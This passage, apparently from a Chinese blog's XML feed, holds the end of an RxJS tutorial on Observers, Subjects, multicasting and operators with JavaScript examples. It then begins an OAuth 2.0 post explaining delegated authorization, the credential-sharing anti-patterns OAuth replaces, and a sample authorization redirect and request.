observer.next(&apos;hi&apos;) &#125;, 1000) return function unsubscribe() &#123; clearInterval(intervalID) &#125;&#125;)const subscription = observable.subscribe(x =&gt; console.log(x));setTimeout(() =&gt; &#123; subscription.unsubscribe();&#125;, 2000) Observer（观察者）观察者是由 Observable发送的值的消费者，观察者只是一组回调函数的集合，每个回调函数对应一种 Observable发送的通知类型：next/error和complete，下面是一个典型的观察者对象： 12345678910111213141516171819const observable = new Observable(observer =&gt; &#123; const intervalID = setInterval(() =&gt; &#123; observer.next(&apos;hi&apos;) &#125;, 1000) return function unsubscribe() &#123; clearInterval(intervalID) &#125;&#125;)const observer = &#123; next: x =&gt; console.log(`Observer got a next value: $&#123;x&#125;`), error: err =&gt; console.log(`Observer got a error: $&#123;err&#125;`), complete: () =&gt; console.log(`Observer got a complete notification`),&#125;const subscription = observable.subscribe(observer);setTimeout(() =&gt; &#123; subscription.unsubscribe();&#125;, 2000) 观察者只是有三个回调函数的对象，每个回调函数对应一种 Observable发送的通知类型 RxJS的观察者也可能是部分的，如果没有提供某个回调函数，Observable的执行也会正常执行，只是某些通知类型可能会被忽略，因为观察者中没有相对应的回调函数 Subscription（订阅）Subscription是表示可清理资源的对象，通常是 Observable的执行，Subscription中有一个重要的方法，即 unsubscribe，不需要任何参数，只是用来清理 Subscription占用的资源，上个版本又叫做 Disposable（可清理对象） Subscription基本上只有一个 unsubscribe() 函数，这个函数用来释放资源或去取消 Observable执行 Subscription还可以合在一起，这样一个 Subscription调用 unsubscribe 方法，可能会有多个 Subscription取消订阅，可以通过把一个Subscription添加到另外一个来做这件事 1234567891011121314151617181920const observable1 = interval(400);const observable2 = interval(300);const subscription = observable1.subscribe(x =&gt; console.log(&apos;first:&apos;, x))const childSubscription = observable2.subscribe(x =&gt; console.log(&apos;second:&apos;, x))subscription.add(childSubscription);setTimeout(() =&gt; &#123; subscription.unsubscribe();&#125;, 1000)/*second: 0first: 0second: 1first: 1second: 2*/// Subscriptions 还有一个 remove(otherSubscription)方法，用来撤销一个已添加的子 Subscription Subject（主体）Subject是一种特殊类型的 Observable,它允许将值多播给多个观察者，所以Subject是多播，而普通的 Observable是单播的（每个已订阅的观察者都拥有 Observable的独立执行） Subject 像是 Observable,但是可以多播给多个观察者，Subject还像是 EventEmitters，维护着多个监听器的注册表 每个 Subject都是 Observable，对于 Subject，可以提供一个观察者并使用 subscribe方法，就可以开始正常接收值，从观察者角度，无法判断 Observable执行是普通的 Observable还是 Subject 在Subject内部，subscribe 不会调用发送值的新执行，它只是将给定的观察者注册到观察者列表中，类似于其他库或语言中的 addListener的工作方式 每个 Subject都是观察者，Subject是一个有如下方法的对象：next(v)/error(e)/complete()，要给 Subject提供新值，只要调用 next(theValue)，它会将值多播给已注册监听该Subject的观察者们。 下面的例子给 Subject添加两个观察者，然后给 Subject提供一些值： 123456789101112131415161718const subject = new Subject();subject.subscribe(&#123; next: (v) =&gt; console.log(`ObserverA: `, v)&#125;)subject.subscribe(&#123; next: (v) =&gt; console.log(`ObserverB: `, v)&#125;)subject.next(1);subject.next(2);/*ObserverA: 1ObserverB: 1ObserverA: 2ObserverB: 2*/ 因为 Subject是观察者，这也就意味着可以把 Subject作为参数传给任何 Observable的 subscribe方法，如下： 1234567891011121314151617181920const subject = new Subject();subject.subscribe(&#123; next: (v) =&gt; console.log(`ObserverA: `, v)&#125;)subject.subscribe(&#123; next: (v) =&gt; console.log(`ObserverB: `, v)&#125;)const observable = from([1, 2, 3])observable.subscribe(subject)/*ObserverA: 1ObserverB: 1ObserverA: 2ObserverB: 2ObserverA: 3ObserverB: 3*/ 使用上面的方法基本上只是通过 Subject将单播的 Observable执行转换为多播的，也说明了Subjects是将任意的 Observable 执行共享给多个观察者的唯一方式。 还有一些特殊的类型的Subject: BehaviorSubject/ReplaySubject和AsyncSubject 多播的Observables多播的Observable通过Subject来发送通知，这个Subject可能有多个订阅者，然后普通的单播 Observable值发送通知给单个观察者。 多播 Observable在底层是通过使用 Subject使得多个观察者可以看到同一个 Observable执行 在低层，这是 multicast操作符的工作原理：观察者订阅一个基础的Subject，然后Subject订阅源Observable 1234567891011121314const source = from([1, 2, 3]);const subject = new Subject();const multicasted = source.multicast(subject);// 在底层使用了 `subject.subscribe(&#123;...&#125;)`:multicasted.subscribe(&#123; next: (v) =&gt; console.log(`ObserverA: `, v)&#125;)multicasted.subscribe(&#123; next: (v) =&gt; console.log(`ObserverB: `, v)&#125;)// 在底层使用了 `source.subscribe(subject)`:multicasted.connect(); multicast操作符返回一个Observable，看起来和普通的Observable没有什么区别，但当订阅就像是Subject,multicast返回的是ConnectableObservable，它只是一个有connect方法的 Observable. connect决定了何时启动共享的Observable执行，因为connect在底层执行了source.subscribe(subject)。它返回的是Subscription，可以取消订阅以取消共享的Observable执行 引用计数手动调用 connect并处理 Subscription过于笨重，当第一个观察者到达时我们要自动连接，而当最后一个观察者取消订阅时我们想要自动地取消共享执行。 第一个观察者订阅了多播的Observable 多播Observable已连接 next值0发送给第一个观察者 第二个观察者订阅了多播Observable next值1发送给第一个观察者 next值1发送给第二个观察者 第一个观察者取消了多播的Observable订阅 next值2发送给第二个观察者 第二个观察者取消了多播 Observable 的订阅 多播 Observable的连接已中断(底层进行的操作是取消订阅) 要实现这点，需要显式调用 connect: 123456789101112131415161718192021222324252627282930313233343536const &#123; interval, Subject &#125; = require(&apos;rxjs&apos;);const &#123; multicast &#125; = require(&apos;rxjs/operators&apos;);const source = interval(500);const multicasted = source.pipe(multicast(() =&gt; new Subject()));let subscription1, subscription2, subscriptionConnect;subscription1 = multicasted.subscribe(&#123; next: v =&gt; console.log(`ObserverA: $&#123;v&#125;`)&#125;)subscriptionConnect = multicasted.connect();setTimeout(() =&gt; &#123; subscription2 = multicasted.subscribe(&#123; next: v =&gt; console.log(`ObserverB: $&#123;v&#125;`) &#125;)&#125;, 600)setTimeout(() =&gt; &#123; subscription1.unsubscribe();&#125;, 1200)// 取消共享的 observable执行的订阅，因此此后 multicasted将不再有订阅者setTimeout(() =&gt; &#123; subscription2.unsubscribe(); subscriptionConnect.unsubscribe();&#125;, 2000)/*ObserverA: 0ObserverA: 1ObserverB: 1ObserverB: 2*/ 如果不想显式调用 connect ,可以使用 ConnectableObservable的 refCount 方法引用计数，这个方法返回 Observable,这个 Observable会追踪多个订阅者。当订阅者的数量从0变成1，它会调用connect以开启共享的执行，当订阅者数量从1变成0时，它会完全取消订阅，停止进一步的执行。 refCount的作用是，当有第一个订阅者时，多播 Observable会自动地启动执行，当最后一个订阅者离开时，多播 Observable会自定地停止执行。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152const &#123; interval, Subject &#125; = require(&apos;rxjs&apos;);const &#123; multicast, refCount &#125; = require(&apos;rxjs/operators&apos;);const source = interval(500);const subject = new Subject();/*const refCounted = source.pipe( multicast(subject), refCount())*/const refCounted = source.pipe(multicast(subject)).pipe(refCount())let subscription1, subscription2;// 这里其实调用了 `connect()`，// 因为 `refCounted` 有了第一个订阅者console.log(&apos;observerA subscribed&apos;);subscription1 = refCounted.subscribe(&#123; next: v =&gt; console.log(`ObserverA: $&#123;v&#125;`)&#125;)setTimeout(() =&gt; &#123; subscription2 = refCounted.subscribe(&#123; next: v =&gt; console.log(`ObserverB: $&#123;v&#125;`) &#125;)&#125;, 600)setTimeout(() =&gt; &#123; console.log(&apos;observerA unsubscribed&apos;); subscription1.unsubscribe();&#125;, 1200)// 这里共享的 Observable 执行会停止，// 因为此后 `refCounted` 将不再有订阅者setTimeout(() =&gt; &#123; console.log(&apos;observerB unsubscribed&apos;); subscription2.unsubscribe();&#125;, 2000)/*observerA subscribedObserverA: 0ObserverA: 1ObserverB: 1observerA unsubscribedObserverB: 2observerB unsubscribed*/ BehaviorSubjectSubject的其中一个变体就是 BehaviorSubject，它有一个当前值的概念，它保存了发送给消费者的最新值，并且当有新的观察者订阅时，会立即从 BehaviorSubject那接收到当前值 BehaviorSubjects适合用来表示随着时间推移的值，例如生日的流是一个Subject,但年龄的流应该是一个BehaviorSubject 下面例子中，BehaviorSubject使用值0进行初始化，当第一个观察者订阅时会得到0，第二个观察者订阅时会得到值2，尽管它是在值2发送之后订阅的。 12345678910111213141516171819202122const beSubject = new BehaviorSubject(0);beSubject.subscribe(&#123; next: v =&gt; console.log(`observerA: $&#123;v&#125;`)&#125;)beSubject.next(1);beSubject.next(2);beSubject.subscribe(&#123; next: v =&gt; console.log(`observerB: $&#123;v&#125;`)&#125;)beSubject.next(3)/*observerA: 0observerA: 1observerA: 2observerB: 2observerA: 3observerB: 3*/ ReplaySubjectReplaySubject 类似于 BehaviorSubject,它可以发送旧值给新的订阅者，但它还可以记录Observable执行的一部分 ReplaySubject 记录 Observable 执行中的多个值并将其回放给新的订阅者 当创建 ReplaySubject时，可以指定回放多个值： 123456789101112131415161718192021222324252627const reSubject = new ReplaySubject(3);reSubject.subscribe(&#123; next: v =&gt; console.log(`observerA: $&#123;v&#125;`)&#125;)reSubject.next(1);reSubject.next(2);reSubject.next(3)reSubject.next(4)reSubject.subscribe(&#123; next: v =&gt; console.log(`observerB: $&#123;v&#125;`)&#125;)reSubject.next(5)/*observerA: 1observerA: 2observerA: 3observerA: 4observerB: 2observerB: 3observerB: 4observerA: 5observerB: 5*/ 除了缓冲数量，还可以指定 window time(以毫秒为单位)来确定多久之前的值可以记录，在下面的示例中，使用了较大的缓存数量100，但 window time 参数只设置了500毫秒。 123456789101112131415const reSubject = new ReplaySubject(100, 500);reSubject.subscribe(&#123; next: v =&gt; console.log(`observerA: $&#123;v&#125;`)&#125;)let i = 1;setInterval(() =&gt; reSubject.next(i++), 200)setTimeout(() =&gt; &#123; reSubject.subscribe(&#123; next: v =&gt; console.log(`observerB: $&#123;v&#125;`) &#125;)&#125;, 1000) 从下面的输出可以看出，第二个观察者得到的值是3、4，这两个值是订阅发生前的500毫秒内发生的： 1234567891011observerA: 1observerA: 2observerA: 3observerA: 4observerB: 3observerB: 4observerA: 5observerB: 5observerA: 6observerB: 6... AsyncSubject只当 Observable 执行完成时（执行complete）它才会将执行的最后一个值发送给观察者 123456789101112131415161718192021const asSubject = new AsyncSubject(100, 500);asSubject.subscribe(&#123; next: v =&gt; console.log(`observerA: $&#123;v&#125;`)&#125;)asSubject.next(1);asSubject.next(2);asSubject.next(3);asSubject.next(4);asSubject.subscribe(&#123; next: v =&gt; console.log(`observerB: $&#123;v&#125;`)&#125;)asSubject.next(5);asSubject.complete();/*observerA: 5observerB: 5*/ AsyncSubject和last操作符类似，因为它也是等待complete通知，一发送一个单一值 Operators（操作符）操作符是运行复杂的异步代码以声明的方式进行轻松组合的基础代码单元 什么是操作符？操作符是Observable类似上的方法。当操作符被调用时，它们不会改变已经存在的 Observable实例。相反，它们返回一个新的 observable，它的 subscription逻辑基于第一个 Observable. 操作符是函数，它基于当前的 Observable 创建一个新的 Observable，这是一个无副作用的操作：前面的 Observable保持不变 操作符本质上是一个纯函数，它接收一个 observable 作为输入，并生成一个新的 observable 作为输出。订阅输出 Observable 同样会订阅输入 Observable。下面实例中，我们创建一个自定义操作符函数，它将输入 Observable 接受的每个值都乘以10 1234567891011121314151617181920function multiplyByTen(input) &#123; return new Observable(observer =&gt; &#123; input.subscribe(&#123; next: v =&gt; observer.next(10 * v), error: err =&gt; observer.error(err), complete: () =&gt; observer.complete(), &#125;) &#125;)&#125;const input = from([1, 2, 3, 4]);const output = multiplyByTen(input);output.subscribe(x =&gt; console.log(x))/*10203040*/ 注意，订阅 output 会导致 input Observable 也被订阅。我们称之为“操作符订阅链”。 实例操作符 vs. 静态操作符通常提到的操作符是实例操作符，是 Observable 实例上的方法，如果上面的 multiplyByTen是官方提供的实例操作符，看起来大概是这样的 12345678910Rx.Observable.prototype.multiplyByTen = function multiplyByTen() &#123; const input = this; return Rx.Observable.create(function subscribe(observer) &#123; input.subscribe(&#123; next: (v) =&gt; observer.next(10 * v), error: (err) =&gt; observer.error(err), complete: () =&gt; observer.complete() &#125;); &#125;);&#125; 实例运算是使用 this 关键字来指代输入的 Observable 函数 注意，这里的 input Observable 不再是一个函数参数，它现在是 this 对象。下面是我们如何使用这样的实例运算符： 12const observable = from([1, 2, 3, 4]).multiplyByTen();observable.subscribe(x =&gt; console.log(x)); 而静态操作符是直接附加到 Observable类上的。静态操作符在内部不使用 this关键字，而是完全依赖于它的参数 静态操作符是附加到 Observable 类上的纯函数，通常用来从头开始创建 Observable 最常见的 静态操作符是所谓的创建操作符，它们只接收非 Observable参数，比如数字，然后创建一个新的Observable，而不是将一个输入 Observable转换为输出 Observable 一个典型的静态操作符例子就是 interval函数，它接收一个数字非Observable作为参数，并生产一个 Observable作为输出： 1const observable = interval(1000); 然而，有些静态操作符可能不同于简单的创建。一些组合操作符可能是静态的，比如 merge、combineLatest、concat，等等。这些作为静态运算符是有道理的，因为它们将多个 Observables 作为输入，而不仅仅是一个，例如： 12345const &#123; interval, merge &#125; = require(&apos;rxjs&apos;);const observable1 = interval(1000);const observable2 = interval(400);const merged = merge(observable1, observable2); 操作符分类可分类：创建、转换、过滤、组合、错误处理、工具等等。 创建 ajax bindCallback bindNodeCallback defer empty from fromEvent fromEventPattern generate interval of range throwError timer iif 合并组合 combineLasted concact forkJoin merge race zip combineAll concatAll exhaust mergeAll startWith withLastestFrom 转换 buffer bufferCount bufferTime bufferToggle bufferWhen concatMap concatMapTo exhaust exhaustMap expand groupBy map mapTo mergeMap mergeMapTo mergeScan pairwise partition pluck scan switchMap switchMapTo window windowCount windowTime windowToggle windowWhen 过滤 audit auditTime debounce debounceTime distinct distinctKey distinctUnitlChanged distinctUnitKeyChanged elementAt filter first ignoreElements last sample sampleTime single skip skipLast skipUntil take takeLast takeUnit takeWhile throttle throttleTime 多播 multicast publish publishBehaivior publishLast pulishReplay share 错误处理 catchError retry retryWhen 工具 tap delay delayWhen dematerizlize materialize observeOn subscribeOn timeInterval timestamp timeout timeoutWith toArray 条件与布尔 defaultIfEmpty every find findIndex isEmpty 数字和聚合 count max min reduce]]></content>
      <categories>
        <category>RxJS</category>
      </categories>
      <tags>
        <tag>RxJS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[oauth2 nodejs实战]]></title>
    <url>%2F2020-07-17-oauth2%20nodejs%E5%AE%9E%E6%88%98.html</url>
    <content type="text"><![CDATA[oauth2 nodejs实战第一章：OAuth2.0是什么是什么OAuth2.0是一个授权协议，允许软件应用代表资源拥有者去访问资源拥有者的资源。应用向资源拥有者请求授权，然后取得令牌token并用它来访问资源。这一切都不需要应用去充当资源拥有者的身份，因为令牌明确表示了被授予的访问权，限制客户端只能执行资源拥有者授权的操作，或者OAuth2.0是一个安全协议，能让第三方应用以有限的权限访问HTTP服务，可以通过构建资源拥有者与HTTP服务间的许可交互机制，让第三方应用代表资源拥有者访问服务，或者通过授权权限给第三方应用，让其代表自己访问服务。 作为一个授权框架，OAuth关注的是如何让一个系统组件获取对另一个系统㢟的访问权限，最常见的情形是客户端应用代表资源拥有者（通常是最终用户）访问受保护资源。三个角色： 资源拥有者有权访问API,并将API访问权限委托出去。资源拥有者一般是能够使用浏览器的人 受保护资源是资源拥有者有限权限访问的组件。这样的组件有多种形式，一般是某种形式的Web API，资源听起来像是某种能下载的东西，但其实这些API支持读、写和其他操作。 客户端是代表资源拥有者访问受保护资源的软件。在OAuth中，只要软件使用了受保护的资源的API,就是客户端。 例子：假设度假拍的照片上传到了照片存储网站，现在想将它们打印出来。照片存储网络的API就是资源，打印服务则是那个API的客户端。作为资源拥有者，需要将一部分权利委托给照片打印服务，让它能读取照片。但你不想让打印服务读取所有照片也不想它有删除或者上传的权限。 旧时代：凭证共享与凭证盗用复制凭证之前流行的做法是复制用户的凭证并用它登录另一个服务。就是照片打印服务假设用户在照片存储服务商使用的凭证与在打印服务上的相同。当用户登录照片打印服务后，该服务使用用户的用户名和密码登录照片存储网络，获取用户的账号访问权，假装用户。 这种情况下，用户需要使用某种凭证与客户端进行身份认证，这些凭证通常是被集中控制的，并受客户端和受保护资源一致认可。客户端先得到用户的用户名和密码或者会话cookie，然后用它们访问受保护资源，假装是用户。受保护资源将客户端视为用户并直接通过身份认证，而实际上与受保护资源建立连接的是客户端。 这种方法要求用户在客户端和受保护资源端使用相同的凭据，使得这种凭据盗用技术只能在同一安全域内使用。也就是说，如果是一个公司控制着客户端、授权服务器和受保护资源，并且这些组件都使用相同的策略和网络控制下运作，这种方法才行得通。如果打印服务和存储服务是由同一个公司提供的，就能采用这种方法，因为用户可以在两个服务使用相同的账户凭据。 这一技术还会将用户的密码暴露给客户端应用，即使在单一安全域使用同一组凭据，这也基本上无法避免。但无论如何，客户端是在扮演用户，受保护资源无法区分资源拥有者和扮演资源拥有者的客户端，因此两者都用相同的用户名和密码。 索取并复制密码如果两个服务处于不同的安全域中，如照片打印例子中的情况，不能复制用户提供的用于登录当前应用的密码了，因为这个密码对于另一个应用来说是无效的。对于这个问题可以采取另一种老套的手段来获取密码：向用户索取。 打印服务想要获取用户的照片，可以提示用户输入照片存储网络上的用户名和密码，打印服务用这些凭据访问受保护资源，扮演用户。在这种情况下，用户用于登录客户端的凭据和用于访问受保护资源的凭据可以不同。很多用户在实际中会运行这样的要求，特别是当使用受保护资源的是一个很有用的服务时。 因此这仍然是当前移动应用通过用户账号访问后端服务的最常见的方法之一：移动应用让用户输入用户名和密码，然后直接将这些凭证通过网络发送给后端API。为了可以持续访问API,客户端应用会保存用户的凭据，以便在必要的时候访问受保护资源，这种做法很危险，一旦任何一个正在使用中的客户端被攻破，这意味着用户在所有系统的账号都被攻破。 开发者密钥复制用户密码并不是一个好方法，如果授予打印服务全局的访问权限，使它能代表由它指定的任何用户并访问存储服务上的所有照片，常见的方式是为客户端颁发一个开发者密钥，让客户端使用该密钥直接调用受保护资源。 开发者密钥是一种全局的密钥，客户端可以用它来充当任意一个由其指定的用户，用户的指定很可能通过一个API参数来完成。这样做的好处是避免了向客户端暴露用户凭据，但代价是要向客户端提供功能强大的开发者密钥。有了这种密钥，打印服务随时都能任意地打印所有用户的所有照片，因此它实际上拥有了自由访问受保护资源的权利。这在一定程度上是可行，但前提是受保护资源充分了解并信任客户端。但是这样的关系几乎不可能存在于两个组织之间，例如照片打印例子中的两个服务。此外，如果客户端的密钥被盗，将对受保护资源造成灾难性损害，因为存储服务的所有用户都将受到影响，无论他们是否使用打印服务。 特殊密码给用户一个特殊密码，此密码仅用于透露给第三方服务。用户自己不会使用这个密码来登录，只是将它粘贴到所使用的第三方应用里。用户不再需要想客户端透露登录密码，受保护资源也不在需要相信客户端都能代表所有用户执行正确的操作。但是这种系统的可用性不好。要求用户除了管理自己的主密码之外，还要创建、分发、管理特殊凭据。因为需要用户来管理这些凭据，一般来说，客户端与凭据本身并没有对应关系，这使得撤销某个应用的访问权限变得很困难。 更好的方法如果能为每个客户端和每个用户的组合分别颁发这种受保护资源具有受限访问的凭据，就可以将受限访问分别与受限凭据绑定。如果有一个基于网络的协议，能够部署到整个互联网上，跨安全边界地生成安全分发这些首先呢的凭据，同时具有良好的用户体验。 授权访问OAuth协议的设计目的是：让最终用户通过OAuth将他们在受保护资源上的部分权限委托给客户端应用，使客户端应用代表他们执行操作。为实现这一点，OAuth在系统中引入了另外一个组件：授权服务器。 受保护资源依赖授权服务器向客户端颁发专用的安全凭据——OAuth访问令牌。为了获取令牌，客户端首先将资源拥有者引导至授权服务器，请求资源拥有者为其授权。授权服务器先对资源拥有者进行身份认证，然后一般会让资源拥有者选择是否对客户端授权。客户端可以请求授权功能或权限范围的子集，该子集可能会被资源拥有者进一步缩小。一旦授权请求被许可，客户端就可以向授权服务器请求访问令牌。按照资源拥有者的许可，客户端可以使用该令牌对受保护资源上的API进行访问。 在这个过程中，没有讲资源拥有者的凭据暴露给客户端：资源拥有者向授权服务器进去身份认证的过程中所用的信息是独立于客户端交互的。客户端没有功能强大的开发者密钥，无法随意访问任何资源，而是必须在得到有效的资源拥有者的授权之后才能访问受保护资源。虽然大多数OAuth客户端可以向授权服务器进行身份认证，但仍然需要得到授权后才能访问资源。 用户通常不必查看或者直接处理访问令牌，OAuth不需要由用户生成令牌并粘贴到客户端，而是简化了这一过程：客户端请求令牌，用户对客户端授权，然后由客户端管理令牌，用户管理客户端应用。 超越HTTP基本认证协议和密码共享反模式上面很多传统方法都是密码反模式的案例，通过共享机密信息（密码）来直接代表当事方（用户）。用户通过与应用共享密码，使应用能够访问受保护的API，然而这种方式非常不安全。 HTTP API最开始是如何引入密码保护功能的呢？可以从 HTTP 协议的历史及其安全手段入手，HTTP 协议制定了一个机制，用户可以凭借该机制在浏览器中使用用户名和密码向一个网页进行身份认证，这就是所谓的 HTTP 基本认证协议 （HTTP basic auth）。还有一种更安全的认证协议，叫做 HTTP 摘要认证（HTTP digest auth）。它们都假设用户在场，并且要求 HTTP 服务器呈现用户的用户名和密码，此外由于 HTTP 是一个无状态的协议，因此每一个 HTTP 事务都要呈现这些凭据。 HTTP不会区分一个事务是由用户通过浏览器发起的，还是通过其他软件发起的，这种基本的灵活性是HTTP协议得到普及的关键原因。这样有一个问题是除了面向用户的网页或服务之外，当 HTTP 用于直接访问 API时，现有的安全机制顺理成章被沿用到新的应用场景，为API和网页服务不断呈现 密码。虽然浏览器可以使用cookie技术或其他会话管理技术，但是访问Web API的HTTP客户端没有这样的机制可用。 OAuth从一开始就被设计成一个可用的API协议，其中主要的交互过程都是在浏览器之外进行的。OAuth的整个流程通常是由最终用户在浏览器中启动的，实际上这也正是委托模式的灵活性和优势所在。但是最终接收令牌、使用令牌访问受保护资源的步骤对用户是不可见的。实际上，OAuth的一些主要事务过程都是发生在用户不在场的情况下，客户端仍然能够代表用户执行操作。OAuth让我们摒弃HTTP基本协议中的观念和假设，将一种功能强大、安全的方式引入现如今的API体系 授权委托：重要性及应用委托概念是OAuth强大功能的根基，虽然OAuth经常被称作授权协议，但它也是一个委托协议。通常，被委托的是用户权限的子集，但是OAuth本身并不承载或者传递权限。相反，它提供一种方法，让客户端可以请求用户将部分权限委托给自己，然后用户可以批准这个委托请求，被批准后，客户端就可以去执行那些操作了。 以照片打印为例子，照片打印服务可以询问用户：是否在这个存储服务存放了照片？如果是我可以帮打印出来。然后用户被引导至照片存储服务，存储服务也会问：打印服务想要获取照片，同意吗？用户可以决定是否同意，即决定是否将访问权限委托给打印服务。 委托协议和授权协议的区别很重要，因为OAuth令牌中携带的授权信息对系统中的大部分组件是不透明的。只有受保护资源需要了解授权信息，只要它能从令牌得知授权信息（既可以直接从令牌中获取，也可以通过某种服务来获取），就可以按照要求提供API服务 用户主导的安全与用户的选择由于OAuth的委托过程需要资源拥有者的参与，因此它提供了一种在很多其他安全模型中不存在的可能性：重要的安全决策可以由最终用户来做。传统上，安全决策一直由集权机构负责。由集权机构决定谁可以使用服务、使用什么客户端以及以何种目的使用。OAuth则允许集权机构将某些决策权交到最终使用软件的用户手中。 OAuth系统常遵循TOFU原则：首次使用时信任（trust on first use）。在TOFU模型中，需要用户在第一次运行时进行安全决策，而且并不为安全决策预设任何先决条件或者配置，仅提示用户做出决策。这个过程可以简单到只是询问用户“要连接新的应用吗”。很多实现运行在这个步骤中进行更多控制。无论用户遇到的是哪种情况，只要具有对应的权限，就能做出安全决策。系统会记住用户的决策，以便以后使用。只要首次建立了授权关系，系统就会在后续的处理过程中继续信任用户的决策：首次使用时信任。 OAuth2.0：优点、缺点和丑陋方面OAuth2.0非常善于获取用户的委托决策，并通过网络传递出去。运行多方参与安全决策过程，尤其是在运行期间让最终用户参与决策。由多个可移动的组件构成的协议，但是在很多方面都比其他方案更简单、更安全。 OAuth2.0设计中有一个重要的阶段，就是不受控的客户端总是比授权服务器或者受保护资源多出好几个数量级。因为单个授权服务器可以很轻松地保护多个资源服务器，并且很可能有许多不同类型的客户端想要访问特定的API。一台授权服务器甚至可以有多个不同的客户端信任等级。这样的架构决策导致的结果就是， 尽可能将复杂性从客户端转移到服务端。这对于客户端开发人员来说是好事，因为客户端成了系统最简单的部分。客户端人员不再需要像在先前的安全协议中，处理签名规范化以及解析复杂的安全策略文档，也不需要担心处理敏感的用户凭据。OAuth令牌提供了一种比密码略复杂的机制，如果使用得当，其安全性比密码高很多。 另一方面，授权服务和受保护资源要承担更多复杂性和安全性方面的责任。客户端只要保护好自身的客户端凭据和用户的令牌即可，单个客户端被攻破会造成损害，但只有该客户端的用户会受到影响。被攻破的客户端也不会泄露资源拥有者的凭据，因此客户端根本没有机会接触这些凭据。然而，授权服务器则需要管理和保护系统中所有客户端和用户的凭证和令牌。虽然这确实使它更容易称为攻击目标，但是保护单个授权服务器要比保护上千台由不同开发人员开发的客户端容易得多。 OAuth2.0的可拓展性和模块化是其最大的优势之一，因为这使得该协议适用于各种环境。然而正是这种灵活性导致不同的实现之间存在基本的兼容性问题。当开发人员想在不同的系统上实现OAuth时，它提供的众多自定义选项更让人困惑。 OAuth2.0不能做什么没有定义HTTP协议之外的情形由于使用bearer令牌的OAuth2.0并不提供消息签名，因此不应该脱离HTTPS使用。机密信息需要在网络上传播，所以OAuth需要TLS这样的传输机制来保护这些信息。 不是身份认证协议OAuth本身并不透露关于用户的信息，本质上是一个部件，能用于在更宏大的技术方案中提供其他功能，另外OAuth 在多个地方用到了身份认证，最典型的就是资源拥有者和客户端软件要向授权服务器进行身份认证。但这种内嵌身份认证的行为并不会使OAuth自身成为身份认证协议 没有定义用户对用户的授权机制尽管它在根本上是一个用户向软件授权的协议。OAuth假设资源拥有者能够控制客户端。要使资源拥有者向另一个用户授权，仅适用OAuth是不行的。但这种授权并不罕见，User Managed Access协议就是为此而生，规定了如何使用OAuth 构建一个支持用户对用户授权的系统。 没有定义授权处理机制提供了一种传达授权委托已发生这一事实，但是它并不定义授权的内容。相反，由服务API定义使用权限范围、令牌之类的OAuth组件来定义一个给定的令牌适用于哪些操作 没有定义令牌格式明确声明了令牌的内容对客户端是完全不透明的。颁发令牌的授权服务器和接收令牌的受保护资源需要理解令牌。这个层面的互操作性要求催发了 JSON Web Token(JWT)格式和令牌内省协议。虽然令牌本身对客户端还是不透明的，但现在它的格式能被其他组件理解。 没有定义加密方法没有新的加密机制，而是允许借用通用的加密机制，这些加密机制不止适用于OAuth。这种有意的遗漏催生了JSON对象签名和加密（JOSE）规范套件，该套件提供了一系列通用的加密机制，可以配合OAuth使用，也可以脱离OAuth使用。 不是单体协议规范被分成了多个定义和流程，每个定义和流程都有各自适用的场景。在某种程度上，可以将OAuth2.0视为一个安全协议生成器，因为它可用于许多不同的应用场景设计安全架构。 小结OAuth是一个应用广泛的安全标准，提供了一种安全访问受保护资源的方式，特别适用于Web API 关注的是如何获取令牌和如何使用令牌 是一个委托协议，提供跨系统授权的方案 用可用性和安全性更高的委托协议取代了密码共享反模式 专注于很好地解决小问题集，因而是整个安全系统中一颗很合用的螺丝钉 第二章：协议与组件获取和使用令牌OAuth是一个复杂的安全协议，需要不同的组件互相通信，从根本上说，OAuth事务中的两个重要步骤是颁发令牌和使用令牌。令牌表示授予客户端的访问权，在OAuth2的各个部分都起到了核心作用。尽管每个步骤的细节都会因多种因素而异，但是一个规范的OAuth事务包含以下事件 资源拥有者向客户端表示他希望客户端代表他执行一些任务 客户端在授权服务器上向资源拥有者请求授权 资源拥有者许可客户端的授权请求 客户端接收到来自授权服务器的令牌 客户端向受保护的资源出示令牌 授权许可的完整过程首先，资源拥有者访问客户端应用，并表明他希望客户端代表自己去使用某一受保护资源。例如，用户会在这一步示意打印服务去使用某个照片存储服务。该服务是个API,客户端知道如何调用它，并且还知道需要通过OAuth来调用。 当客户端发现需要获取一个新的OAuth访问令牌时，它会将资源拥有者重定向至授权服务器，并附带一个授权请求，表示它要向资源拥有者请求一些权限。例如，为了能读取照片，照片打印服务可以向照片存储服务请求访问权限。由于是的是Web客户端，因此采用HTTP重定向的方式将用户代理重定向至授权服务器的授权端点，客户端的响应如下： 12345678HTTP/1.1 302 Moved Temporarilyx-powered-by: ExpressLocation: http://localhost:9001/authorize?response_type=code&amp;scope=foo&amp;client_id=oauth-client-1&amp;redirect_uri=http%3A%2F%2Flocalhost%3A9000%2Fcallback&amp;state=Lwt50DDQKUB8U7jtfLQCVGDL9cnmwHH1Vary: AcceptContent-Type: text/html; charset=utf-8Content-Length: 444Date: Fri, 31 Jul 2015 20:50:19 GMTConnection: keep-alive 这个重定向响应导致浏览器向授权服务器发送一个GET请求。 123456GET /authorize?response_type=code&amp;scope=foo&amp;client_id=oauth-client-1&amp;redirect_uri=http%3A%2F%2Flocalhost%3A9000%2Fcallback&amp;state=Lwt50DDQKUB8U7jtfLQCVGDL9cnmwHH1 HTTP/1.1Host: localhost:9001User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0)Gecko/20100101 Firefox/39.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Referer: http://localhost:9000/Connection: keep-alive 客户端通过在发送给用户的URL中包含参数，来标识自己的身份和要请求的授权详情，如权限范围等。虽然请求并不是由客户端直接发出的，但授权服务器会解析这些参数并做出适当反应。 然后授权服务器会要求用户进行身份认证，进一步对确认资源拥有者的身份以及能向客户端授予哪些权限来说至关重要。 用户身份认证直接在用户（和用户浏览器）与授权服务器之间进行，这个过程对客户端应用不可见。这一重要特性避免了用户将自己的凭据透露给客户端应用，对抗这种反模式发明OAuth的原因。 另外因为资源拥有者通过浏览器与授权端点交互，所有也要通过浏览器来完成身份认证，因此，有很多身份认证技术可以用于用户身份认证流程。OAuth没有规定应该使用哪种身份认证技术，授权服务器可以自由选择，例如用户名/密码、加密证书、安全令牌、联合单点登录或者其他方式。 